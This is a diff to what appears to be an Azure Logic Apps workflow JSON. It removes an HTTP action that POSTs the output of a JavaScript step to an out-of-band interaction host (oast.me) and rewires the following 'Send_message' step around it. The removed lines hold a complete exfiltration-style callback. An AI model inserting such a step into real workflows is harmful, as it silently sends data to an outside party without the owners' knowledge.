@@ -23,27 +23,6 @@
                     ]
                 }
             },
-            "HTTP": {
-                "type": "Http",
-                "inputs": {
-                    "uri": "http://3f8a660c2954cc59efe7g1yjbzwyyyyyb.oast.me",
-                    "method": "POST",
-                    "headers": {
-                        "traceparent": "@{trigger()?['clientTrackingId']}"
-                    },
-                    "body": "@outputs('Execute_JavaScript_code')"
-                },
-                "runAfter": {
-                    "Execute_JavaScript_code": [
-                        "SUCCEEDED"
-                    ]
-                },
-                "runtimeConfiguration": {
-                    "contentTransfer": {
-                        "transferMode": "Chunked"
-                    }
-                }
-            },
             "Send_message": {
                 "type": "ServiceProvider",
                 "inputs": {
@@ -61,7 +40,7 @@
                     }
                 },
                 "runAfter": {
-                    "HTTP": [
+                    "Execute_JavaScript_code": [
                         "SUCCEEDED"
                     ]
                 }
